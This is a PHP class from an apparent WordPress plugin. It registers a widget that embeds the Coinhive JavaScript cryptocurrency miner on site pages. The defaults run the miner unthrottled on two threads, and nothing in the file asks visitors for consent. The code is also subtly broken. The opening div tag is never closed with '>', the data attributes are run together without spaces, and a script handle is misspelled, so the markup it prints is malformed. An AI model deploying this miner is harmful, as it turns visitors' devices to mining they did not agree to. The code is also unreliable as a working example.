<?php

class Coinero_Coinhive_JavaScript_Miner extends Coinero_Widget
{
    function __construct()
    {
        parent::__construct('coinero-javascript-miner', __('JavaScriptMiner', 'wp-coinhive'));
    }

    function render_content($atts, $content, $script_prefix)
    {
        wp_enqueue_script($script_prefix . '-javsacript-miner');
        wp_enqueue_script('wp-coinero');
        echo '<div class="coinhive-javascript-miner-data"';
        foreach ($atts as $key => $value) {
            if (!empty($value)) {
                echo 'data-' . $key . '="' . esc_attr($value) . '"';
            }
        }
        echo '</div>';
    }

    function filter_render_atts($atts = array())
    {
        return shortcode_atts(array(
            'classes' => '',
            'key' => $this->get_sitekey(),
            // Constructor arguments
            'threads' => '2',
            'autoThreads' => 'false',
            'throttle' => '0',
            'forceASMJS' => 'false',

            // Control arguments
            'start' => 'CoinHive.IF_EXCLUSIVE_TAB',

            // Token arguments
            'targetHashes' => '256',

            // User arguments
            'userName' => false,

            // Callback Arguments
            'on-open' => false,
            'on-authed' => false,
            'on-close' => false,
            'on-error' => false,
            'on-found' => false,
            'on-job' => false,
            'on-accepted' => false,
            'debug' => true

        ), $atts);
    }
}

return new Coinero_Coinhive_JavaScript_Miner();